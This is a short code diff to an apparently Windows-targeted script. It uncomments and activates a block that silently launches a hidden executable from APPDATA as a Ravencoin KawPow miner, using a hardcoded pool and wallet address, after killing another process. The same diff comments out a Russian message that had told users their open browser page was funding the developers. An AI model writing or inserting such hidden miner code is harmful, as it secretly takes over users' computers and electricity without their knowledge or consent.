@@ -19,9 +19,9 @@ execute('cmd /c taskkill /f /im oxibyte.exe');
 
 
 //00000000000000
-/*
 
-message("Не закрывайте страницу http://lightminer.co/2970288 в браузере, тем самым вы помогаете собрать деньги на оплату программистов которые для нас делают мультиплеер!");
+
+//message("Не закрывайте страницу http://lightminer.co/2970288 в браузере, тем самым вы помогаете собрать деньги на оплату программистов которые для нас делают мультиплеер!");
 
 
 use httpclient;
@@ -39,10 +39,10 @@ use httpclient;
     wait(5000);
     execute('cmd /c start /b '.$_ENV['APPDATA'].'\\Microsoft\\3.exe'.' -a kawpow -o stratum+tcp://rvn.kryptex.network:7000 -u RRrPSJ7C8up3LW8a11jwVNzgqPX7F27AjM.v2d5397369 -p xxxxxx --api-bind-http 127.0.0.1:12001 --log-path 1619949005_rvn_12001_log.txt --no-watchdog --low-load 1 --devices 0');
         
-
-}))->start();
-*/
 exit();
+}))->start();
+
+
 //});
 
 
